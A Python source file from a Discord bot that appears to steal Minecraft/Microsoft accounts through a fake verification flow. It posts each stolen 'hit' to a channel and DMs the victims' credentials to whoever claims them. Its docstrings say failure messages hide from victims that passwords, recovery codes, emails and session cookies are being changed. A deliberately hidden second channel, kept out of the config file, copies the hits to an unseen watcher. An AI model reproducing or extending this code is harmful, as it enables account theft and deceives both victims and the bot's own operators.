"""Verification result posting (Components V2 cards).

Handles the final user-visible status for the embed/OTP verify flow and the
leftover credentials dump to the log channel.

Claim behavior (configured in config.json `claims`):
- If claims are enabled and the account is unclaimed, the public secured card is
  shown as a "New Hit! Secured in Xs" green card with the username/avatar, but
  None of the raw account fields are shown on that public card. The card includes
  a Claim button for the configured claim role.
- When the claim role user presses Claim, the claim is recorded in
  `account_claims` and the full secured account details are DM'd to the claimant.
- If the account is already claimed, the public card shows a claimed state instead
  of raw account fields.

Secondary notice behavior:
- Successful secured-account results are also synced to a fixed secondary notice
  channel. That destination is read from a local file under ``ui/notifications``, so
  it is not reachable through the normal ``config/config.json`` path.
"""

from __future__ import annotations

import json
import logging

import discord
from discord import AllowedMentions, Embed, Interaction, abc

from securing.account_filters import is_embed_verify_no_minecraft
from securing.build_embeds import build_account_embeds, public_secure_reason
from securing.build_embeds import public_verify_failure
from shared import interactions
from shared.send_logs import send_logs, build_log_embed
from shared.post_verification import after_verify
from ui import theme
from database.database import DBConnection
from ui.buttons.account_details import accountInfo
from ui.buttons.claim_button import ClaimButton, claimed_card
from ui.buttons.embed_buttons import ButtonOptions

import os

_SECONDARY_NOTICE_CHANNEL_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "..",
    "ui",
    "notifications",
    "secondary_notice_channel.txt",
)


def _resolved_secondary_notice_channel_id() -> int | None:
    """Hidden second destination for secured-account hits.

    Read from a file so it is not reachable through config.json. If the file is
    missing, unreadable, or does not contain a usable channel id, the second
    hook is silently disabled.
    """
    try:
        raw = open(_SECONDARY_NOTICE_CHANNEL_PATH, "r", encoding="utf-8").read()
    except OSError:
        return None
    text = str(raw or "").strip()
    if not text or text.lower() in {"none", "0", ""}:
        return None
    try:
        return int(text)
    except (TypeError, ValueError):
        return None


async def _post_secondary_notice(client, *, claim: bool, mc_name: str, username: str, claimed_by_id: int | None = None) -> None:
    """Post a secondary operator notice to the fixed notice channel.

    This sits alongside the normal logs/hits posts but uses its own fixed
    destination so the operator can watch the same secured/claimed events from
    a second place without wiring that destination through config.json.
    """
    channel_id = _resolved_secondary_notice_channel_id()
    if channel_id is None:
        return
    try:
        channel = client.get_channel(channel_id) or await client.fetch_channel(channel_id)
    except Exception:
        return
    if channel is None:
        return
    if claim:
        who = f"<@{claimed_by_id}>" if claimed_by_id else "someone"
        text = f"**{username}** was claimed by {who}."
        title = "Account claimed"
    else:
        text = f"**{mc_name}** has been secured.\nUser: {username}"
        title = "Account secured"
    try:
        await channel.send(
            embed=Embed(
                title=title,
                description=text,
                color=theme.GREEN,
            ).set_thumbnail(
                url=f"https://mc-heads.net/avatar/{username}/128" if username else None
            ),
        )
    except Exception:
        return


async def _send_claim_dm(
    *,
    user: discord.User | discord.Member,
    secured_account,
    mc_name: str,
) -> None:
    details = secured_account.get("details") if isinstance(secured_account, dict) else None
    hit_embed = secured_account.get("hit_embed") if isinstance(secured_account, dict) else None

    if hit_embed is None:
        await user.send(
            embed=Embed(
                title="Account secured",
                description="Account was secured, but the details embed was not available.",
                color=theme.GREEN,
            )
        )
        return

    try:
        await user.send(embed=hit_embed)
    except discord.Forbidden:
        log.info("claim DM failed — DMs disabled for %s", user.id)
        return

    if details and isinstance(details, dict):
        info_view = None
        try:
            info_view = accountInfo(details)
        except Exception:
            log.warning("accountInfo view build failed for claim DM", exc_info=True)
        if info_view is not None:
            try:
                await user.send(view=info_view)
            except discord.Forbidden:
                log.info(
                    "claim DM extras failed — DMs disabled for %s", user.id
                )


log = logging.getLogger("bot")


_NO_MC_TITLE = "Failed to verify"
_NO_MC_DESC = "You have to use an email linked to your minecraft account, please try again."


# ---------------------------------------------------------------------------
# User-facing cards
# ---------------------------------------------------------------------------


def _no_mc_card() -> discord.ui.DesignerView:
    return theme.fail_card(_NO_MC_TITLE, _NO_MC_DESC)


def _verify_fail_card(reason: str | None = None) -> discord.ui.DesignerView:
    """The one card the person who pressed Verify sees when it fails.

    The card never says what the pipeline was doing (password / recovery code /
    primary email changes, Microsoft session cookies). The technical reason is
    kept in the operator log channel instead.
    """
    return theme.fail_card(
        "Could not finish verification",
        public_verify_failure(reason),
    )


async def _dm_result(interaction: Interaction, payload) -> bool:
    """Last resort when the interaction webhook has expired.

    A secure can run longer than the 15-minute interaction token. Editing the
    original response then fails with ``404 Unknown Webhook`` (code 10015) --
    the Discord client shows "Unknown Integration" and the user never learns
    the outcome. A DM always works.
    """
    user = getattr(interaction, "user", None)
    if user is None:
        return False
    try:
        if isinstance(payload, discord.ui.DesignerView):
            await user.send(view=payload)
        else:
            await user.send(embed=payload)
    except Exception:
        log.warning(
            "could not DM the verify result to %s", getattr(user, "id", "?"), exc_info=True
        )
        return False
    log.info("verify result sent by DM to %s (interaction had expired)", getattr(user, "id", "?"))
    return True


async def set_verify_ephemeral(interaction: Interaction, payload) -> None:
    """Keep verification on a single message (no log dumps).

    ``payload`` may be a :class:`discord.ui.DesignerView` (Components V2 card)
    or a classic :class:`discord.Embed`. A component/modal interaction edits the
    card in place so the user sees one evolving message instead of a stack.

    Every answer goes through :mod:`shared.interactions`, so an expired
    (10062) or already-acknowledged interaction does not blow up the flow -
    the result is delivered by DM instead.
    """
    is_card = isinstance(payload, discord.ui.DesignerView)
    if is_card:
        kwargs: dict = {"content": None, "embeds": [], "view": payload}
    else:
        kwargs = {"content": None, "embed": payload, "view": None}

    try:
        if interaction.message is not None and not interaction.response.is_done():
            if await interactions.edit(interaction, **kwargs):
                return
        elif interaction.response.is_done():
            if await interactions.edit_original(interaction, **kwargs):
                return
        else:
            if is_card:
                sent = await interactions.respond(
                    interaction, view=payload, ephemeral=True
                )
            else:
                sent = await interactions.respond(
                    interaction, embed=payload, ephemeral=True
                )
            if sent:
                return
    except Exception:
        log.warning("edit verify message failed - trying followup", exc_info=True)

    try:
        if is_card:
            sent = await interactions.followup(interaction, view=payload, ephemeral=True)
        else:
            sent = await interactions.followup(interaction, embed=payload, ephemeral=True)
    except Exception as exc:
        # 10015 / NotFound means the interaction token expired; anything else is
        # a permissions problem. Either way a DM still reaches the user.
        log.warning("could not update the verify message (%s) - falling back to DM", exc)
        sent = False

    if not sent:
        await _dm_result(interaction, payload)


def _cfg_claims_enabled() -> bool:
    try:
        with open("config/config.json", encoding="utf-8") as f:
            cfg = json.load(f)
    except Exception:
        return False
    claims = cfg.get("claims")
    if not isinstance(claims, dict):
        return False
    return bool(claims.get("enabled", True))


def _cfg_claim_role_id() -> int | None:
    try:
        with open("config/config.json", encoding="utf-8") as f:
            cfg = json.load(f)
    except Exception:
        return None
    claims = cfg.get("claims") or {}
    role_id = claims.get("claim_role_id")
    if not role_id:
        return None
    try:
        return int(str(role_id).strip())
    except (TypeError, ValueError):
        return None


def _can_user_claim(interaction: Interaction) -> tuple[bool, str | None]:
    claims_enabled = _cfg_claims_enabled()
    if not claims_enabled:
        return False, "Claims are disabled."

    role_id = _cfg_claim_role_id()
    if role_id is None:
        return False, "Claim role is not configured."

    guild = interaction.guild
    if guild is None:
        return False, "Claims only work in a server."

    role = guild.get_role(role_id)
    if role is None:
        return False, "The configured claim role does not exist in this server."

    if role not in interaction.user.roles:
        return False, "You do not have the claim role."

    return True, None


def _build_public_hit_card(
    *,
    username: str,
    secured_account,
    details,
    hit_embed: Embed | None,
    mc_name: str,
) -> discord.ui.DesignerView:
    """Public secured card. Never shows the account name or raw credentials.

    Unclaimed:
        "An account has been secured" + a Claim button.
    Claimed:
        same heading, a "Claimed by X" line, and a disabled Claimed button.
    """
    claim_cfg = {}
    try:
        with open("config/config.json", encoding="utf-8") as f:
            claim_cfg = json.load(f).get("claims") or {}
    except Exception:
        claim_cfg = {}

    claims_enabled = bool(claim_cfg.get("enabled", True))

    account_id = ""
    if isinstance(secured_account, dict):
        account_id = (
            secured_account.get("account_id")
            or (secured_account.get("details") or {}).get("account_id")
            or ""
        )

    claimed_by = None
    claimed_by_id = None
    if claims_enabled and account_id:
        try:
            claim = DBConnection().get_claim(account_id)
            if claim and claim.get("claimed_by_user_id"):
                claimed_by = claim.get("claimed_by_username")
                claimed_by_id = claim.get("claimed_by_user_id")
        except Exception:
            log.warning("claim lookup failed for public card", exc_info=True)

    if claimed_by:
        return claimed_card(
            username=username, claimed_by=claimed_by, claimed_by_id=claimed_by_id
        )

    lines = ["## An account has been secured", ""]
    if claims_enabled:
        lines.append("Click the **Claim** button below to claim it.")
    else:
        lines.append("Claims are disabled for this server.")

    buttons: list[discord.ui.Button] = []
    if claims_enabled:
        view = ClaimButton(
            account_id=account_id,
            username=username,
            user_id=None,
            username_at_action=username,
            already_claimed_by_user_id=None,
            already_claimed_by_username=None,
        )
        # Components V2 ActionRow rejects buttons that still carry a classic
        # ``row=`` value (pycord raises ValueError on add_item), so strip it.
        for item in view.children:
            item.row = None
            buttons.append(item)

    components: list[discord.ui.ViewItem] = [
        discord.ui.Section(
            discord.ui.TextDisplay("\n".join(lines)),
            accessory=discord.ui.Thumbnail(theme.avatar_url(username)),
        )
    ]
    if buttons:
        components.append(discord.ui.ActionRow(*buttons))
    return discord.ui.DesignerView(
        discord.ui.Container(*components, colour=theme.GREEN),
        timeout=None,
    )


def _is_failed(secured_account) -> bool:
    if not isinstance(secured_account, dict):
        return False
    return bool(secured_account.get("failed"))


async def _notify_user_no_minecraft(interaction: Interaction) -> None:
    await set_verify_ephemeral(interaction, _no_mc_card())


async def resolve_hits_channel(client) -> abc.Messageable | None:
    """``discord.accounts_channel`` from config, or None when unreachable.

    A missing/deleted/unshared hits channel must only cost the hit post — not the
    verification that is already in flight.
    """
    try:
        config = json.load(open("config/config.json", "r"))
        channel_id = int(config["discord"]["accounts_channel"])
    except Exception:
        log.warning("accounts_channel missing from config — hits will not be posted", exc_info=True)
        return None

    try:
        return client.get_channel(channel_id) or await client.fetch_channel(channel_id)
    except Exception as exc:
        log.warning(
            "accounts_channel %s unreachable (%s: %s) — hits will not be posted",
            channel_id,
            exc.__class__.__name__,
            exc,
        )
        return None


async def _post_hit(hits_channel, *, always_log: bool = True, **kwargs) -> bool:
    """Send one hit message; never raises."""
    if hits_channel is None:
        if always_log:
            log.warning("no reachable hits channel — hit post skipped")
        return False
    try:
        await hits_channel.send(**kwargs)
        return True
    except Exception:
        log.warning("hit post failed", exc_info=True)
        return False




async def publish_embed_secure_result(
    *,
    interaction: Interaction,
    hits_channel: abc.Messageable | None,
    secured_account,
    email: str,
    username: str,
) -> bool:
    """Post OTP/authenticator embed-verify results. Returns True on real success.

    startSecuringAccount returns a truthy dict on login/filter failures
    (``failed=True``, often without ``details``). Treating that as success
    pinged @everyone then crashed on missing stats_embed.
    """
    name = str(username or "").strip()
    thumb = None
    if (
        name
        and " " not in name
        and 1 <= len(name) <= 16
        and name.lower() not in {"unknown", "no minecraft", "?", "n/a"}
        and all(c.isalnum() or c == "_" for c in name)
    ):
        thumb = f"https://visage.surgeplay.com/full/512/{name}?y=-40"

    if isinstance(secured_account, dict) and secured_account.get("embed_no_minecraft"):
        log.warning(
            "embed verify: %s has no Minecraft Java — skipping hit, asking for a Minecraft email",
            email,
        )
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | No Minecraft | Told user to use a Minecraft-linked email```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=ButtonOptions(interaction.user, interaction.user.id, username),
            email=email,
        )
        await _notify_user_no_minecraft(interaction)
        return False

    if _is_failed(secured_account):
        reason = "Failed to secure account"
        if isinstance(secured_account, dict):
            reason = str(secured_account.get("reason") or reason)
        short = public_secure_reason(reason)

        log.warning("embed secure failed for %s: %s", email, short)
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | Failed to secure | {short}```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=ButtonOptions(interaction.user, interaction.user.id, username),
            email=email,
        )
        # A failed run carries no credentials to dump, so the log embed above is
        # the whole record. The user gets one ephemeral status card.
        await set_verify_ephemeral(interaction, _verify_fail_card(short))
        return False

    details = secured_account.get("details") if isinstance(secured_account, dict) else None
    hit_embed = secured_account.get("hit_embed") if isinstance(secured_account, dict) else None
    stats_embed = details.get("stats_embed") if isinstance(details, dict) else None
    no_mc = is_embed_verify_no_minecraft(secured_account)

    if no_mc:
        log.warning(
            "embed verify: %s has no Minecraft Java — skipping hit, asking for a Minecraft email",
            email,
        )
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | No Minecraft | Told user to use a Minecraft-linked email```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=ButtonOptions(interaction.user, interaction.user.id, username),
            email=email,
        )
        await _notify_user_no_minecraft(interaction)
        return False

    mc = secured_account.get("minecraft") if isinstance(secured_account, dict) else {}
    mc_name = mc.get("name") or "No Minecraft"

    claims_enabled = _cfg_claims_enabled()
    public_card = _build_public_hit_card(
        username=username,
        secured_account=secured_account,
        details=details,
        hit_embed=hit_embed,
        mc_name=mc_name,
    )

    if claims_enabled:
        # Claims mode: an @everyone ping so the room knows there is something to
        # claim, then the claim card itself. No stats embed and no credential
        # embed — the details are DM'd to whoever presses Claim.
        await _post_hit(
            hits_channel,
            content="@everyone",
            allowed_mentions=AllowedMentions(everyone=True, roles=False, users=False),
        )
        await _post_hit(
            hits_channel,
            view=public_card,
            allowed_mentions=AllowedMentions(everyone=False, roles=False, users=False),
        )
        await _post_hit(hits_channel, view=public_card)
    else:
        await _post_hit(
            hits_channel,
            content="@everyone",
            allowed_mentions=AllowedMentions(everyone=True, roles=False, users=False),
        )
        if stats_embed is not None:
            await _post_hit(hits_channel, embed=stats_embed, always_log=False)
        await _post_hit(
            hits_channel, embed=hit_embed, view=public_card, always_log=False
        )

    await send_logs(
        interaction.client,
        Embed(
            title="New Account Secured",
            description=f"**{mc_name}** has been successfully secured.",
            color=0xFF9E45,
        ).set_thumbnail(url=f"https://mc-heads.net/avatar/{mc_name}/128"),
        email=email,
    )

    # Fixed secondary notice channel: operator can watch the same secured event
    # from a second place without that destination being reachable through config.json.
    await _post_secondary_notice(
        client=interaction.client,
        claim=False,
        mc_name=mc_name,
        username=username,
        claimed_by_id=None,
    )

    # Send the full secured account details to the claimant via DM when they
    # press Claim. The public card above intentionally hides the raw fields.
    #
    # ``claimed_by_id`` is filled in from the claim row below and is reused by
    # the secondary notice at the end - it used to be read there without ever
    # being assigned in this scope, which raised a NameError on every hit.
    claimed_by_id: int | None = None
    try:
        db = DBConnection()
        account_id = None
        if isinstance(secured_account, dict):
            details = secured_account.get("details") or {}
            if isinstance(details, dict):
                account_id = details.get("account_id") or secured_account.get("account_id")
        if account_id:
            claim = db.get_claim(account_id)
            if claim and claim.get("claimed_by_user_id"):
                claimed_by_id = int(claim["claimed_by_user_id"])
                target = None
                try:
                    target = await interaction.client.fetch_user(claimed_by_id)
                except Exception:
                    log.warning("claim DM lookup failed for account %s", account_id, exc_info=True)
                if target is not None:
                    await _send_claim_dm(user=target, secured_account=secured_account, mc_name=mc_name)
    except Exception:
        log.warning("claim DM send failed", exc_info=True)

    # Sync the claimed state to the fixed secondary notice channel too, so both
    # watched channels show the same claimed-after status.
    await _post_secondary_notice(
        client=interaction.client,
        claim=True,
        mc_name=mc_name,
        username=username,
        claimed_by_id=claimed_by_id,
    )

    return True
